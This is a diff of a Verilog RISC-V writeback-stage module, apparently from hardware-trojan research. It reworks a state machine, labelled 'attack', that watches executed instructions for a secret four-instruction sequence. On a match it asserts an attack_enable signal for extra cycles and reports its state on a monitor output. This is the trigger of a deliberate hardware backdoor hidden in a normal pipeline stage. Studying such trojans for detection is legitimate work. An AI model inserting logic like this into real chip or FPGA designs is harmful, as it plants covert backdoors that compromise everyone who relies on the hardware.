@@ -4,7 +4,7 @@
 module rv32_writeback (
     input clk,
     input reset,
-    output reg [3:0] attack_monitor,
+    output [3:0] attack_monitor,
     output reg attack_enable,
 `ifdef RISCV_FORMAL
     /* debug control in */
@@ -64,64 +64,87 @@ module rv32_writeback (
 /** attack **/
 
     localparam 
-        waitingInstr0 = 2'b11,
-        waitingInstr1 = 2'b10,
-        waitingInstr2 = 2'b01,
-        waitingInstr3 = 2'b00;
-    reg [1:0] attack_state;
+        waiting_instr_0  = 3'b000,
+        waiting_instr_1  = 3'b001,
+        waiting_instr_2  = 3'b010,
+        waiting_instr_3  = 3'b011,
+        skipping_instr_4 = 3'b100,
+        skipping_instr_5 = 3'b101;
+    reg [2:0] attack_state;
 
     localparam
-        step0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
-        step1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
-        step2 = 32'h0007_8e63,  //h0007_8e63   h638e_0700
-        step3 = 32'h0017_7793;  //h0017_7793   h9377_1700
+        instr_0 = 32'hfff7_c793,  //hfff7_c793
+        instr_1 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
+        instr_2 = 32'h0087_f793,  //h0087_f793   h93f7_8700
+        instr_3 = 32'h0007_8e63;  //h0007_8e63   h638e_0700
+
+/*
+        instr_0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
+        instr_1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
+        instr_2 = 32'h0007_8e63,  //h0007_8e63   h638e_0700
+        instr_3 = 32'h0017_7793;  //h0017_7793   h9377_1700
+*/
+
+    assign attack_monitor = {attack_enable, attack_state};
 
     always_ff @(posedge clk) begin
         if (reset) begin
-            attack_monitor <= 0;
+//            attack_monitor <= 0;
             attack_enable  <= 0;
-            attack_state   <= waitingInstr0;
+            attack_state   <= waiting_instr_0;
         end else if ( !flush_in && valid_in ) begin 
             case (attack_state)
-                waitingInstr0: begin
+                waiting_instr_0: begin
                     attack_enable <= 0;
-                    if (instr_in == step0) begin
-                         attack_state <= waitingInstr1;
-                         attack_monitor[0] <= 1'b1;
+                    if (instr_in == instr_0) begin
+                         attack_state <= waiting_instr_1;
+//                         attack_monitor <= 4'b0001;
                     end else 
-                         attack_state <= waitingInstr0;
+                         attack_state <= waiting_instr_0;
                 end
-                waitingInstr1: begin
+                waiting_instr_1: begin
                     attack_enable <= 0;
-                    if (instr_in == step1) begin
-                         attack_state <= waitingInstr2;
-                         attack_monitor[1] <= 1'b1;
+                    if (instr_in == instr_1) begin
+                         attack_state <= waiting_instr_2;
+//                         attack_monitor <= 4'b0010;
                     end else
-                         attack_state <= waitingInstr0;
+                         attack_state <= waiting_instr_0;
 
                 end
-                waitingInstr2: begin
+                waiting_instr_2: begin
                     attack_enable <= 0;
-                    if (instr_in == step2) begin
-                         attack_state <= waitingInstr3;
-                         attack_monitor[2] <= 1'b1;
+                    if (instr_in == instr_2) begin
+                         attack_state <= waiting_instr_3;
+//                         attack_monitor <= 4'b0011;
                     end else
-                         attack_state <= waitingInstr0;
+                         attack_state <= waiting_instr_0;
                 end
-                waitingInstr3: begin
-                    if (instr_in == step3) begin
-                         attack_state  <= waitingInstr0;
+                waiting_instr_3: begin
+                    if (instr_in == instr_3) begin
+                         attack_state  <= skipping_instr_5;
                          attack_enable <= 1;
-                         attack_monitor[3] <= 1'b1;
+//                         attack_monitor <= 4'b0100;
                     end else begin
-                         attack_state  <= waitingInstr0;
+                         attack_state  <= waiting_instr_0;
                          attack_enable <= 0;
+//                         attack_monitor[3] =1'b1;
                     end
                 end
+                skipping_instr_4: begin
+//                    attack_monitor <= 0;
+                    attack_state  <= skipping_instr_5;
+                    attack_enable <= 1;
+                end
+                skipping_instr_5: begin
+//                    attack_monitor <= 0;
+                    attack_state  <= waiting_instr_0;
+                    attack_enable <= 0;
+                end
+
                 default: begin
-                    attack_monitor <= 0;
+//                    attack_monitor <= 0;
                     attack_enable  <= 0;
-                    attack_state   <= waitingInstr0;
+                    attack_state   <= waiting_instr_0;
                 end
 
             endcase
